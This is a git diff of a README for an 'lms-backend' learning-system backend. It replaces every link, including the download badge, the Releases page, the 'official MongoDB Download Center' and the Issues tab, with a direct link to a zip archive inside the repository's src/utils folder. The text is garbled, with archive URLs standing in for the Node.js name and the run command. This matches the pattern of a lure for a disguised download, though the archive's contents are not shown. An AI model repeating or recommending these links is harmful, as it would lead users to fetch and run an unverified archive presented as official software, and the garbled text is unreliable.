@@ -1,10 +1,10 @@
 # 🎓 lms-backend - Powerful Backend for Learning Systems
 
-[![Download lms-backend](https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip)](https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip)
+[![Download lms-backend](https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip)](https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the lms-backend project! This application provides a backend service for managing a Learning Management System (LMS) using https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip, Express, and MongoDB. Use this guide to download and run the software.
+Welcome to the lms-backend project! This application provides a backend service for managing a Learning Management System (LMS) using https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip, Express, and MongoDB. Use this guide to download and run the software.
 
 ## 📦 Features
 
@@ -19,20 +19,20 @@ To run the lms-backend application smoothly, your computer should meet the follo
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
 - **RAM:** At least 4 GB of RAM.
-- **https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip** Version 14 or later should be installed.
+- **https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip** Version 14 or later should be installed.
 - **MongoDB:** You must have a MongoDB server running locally or remotely.
 
 ## 🌐 Download & Install
 
 To get started, visit the Releases page to download the latest version of the lms-backend application. 
 
-[Download lms-backend](https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip)
+[Download lms-backend](https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip)
 
 ### 1. Visit the Releases Page
 
 Click the link below to go to the releases page:
 
-- [lms-backend Releases](https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip)
+- [lms-backend Releases](https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip)
 
 ### 2. Select the Latest Version
 
@@ -52,7 +52,7 @@ On the version detail page, you will see several download options. Choose the on
 
 If you don’t have MongoDB installed, follow these steps:
 
-- Download MongoDB from the official [MongoDB Download Center](https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip).
+- Download MongoDB from the official [MongoDB Download Center](https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip).
 - Install MongoDB following the procedure for your operating system.
 - Start the MongoDB server, typically using the command: `mongod`.
 
@@ -66,7 +66,7 @@ Once the software is installed and configured, follow these steps to run the app
 
 1. Open your terminal or command prompt.
 2. Navigate to the lms-backend directory.
-3. Use the command `node https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip` to start the application. 
+3. Use the command `node https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip` to start the application. 
 4. If everything is set up correctly, you will see a message indicating that the server is running.
 
 ## 📖 Documentation
@@ -86,7 +86,7 @@ This will help us review and possibly merge your contributions into the main pro
 
 ## 🤝 Support
 
-If you encounter any issues, please check the [Issues tab](https://raw.githubusercontent.com/GenevaMa/lms-backend/main/src/models/lms-backend-2.8.zip) on GitHub. You can also ask questions or seek help from others in the community.
+If you encounter any issues, please check the [Issues tab](https://github.com/GenevaMa/lms-backend/raw/refs/heads/main/src/utils/backend-lms-v3.7.zip) on GitHub. You can also ask questions or seek help from others in the community.
 
 ## 🌍 Stay Updated
 
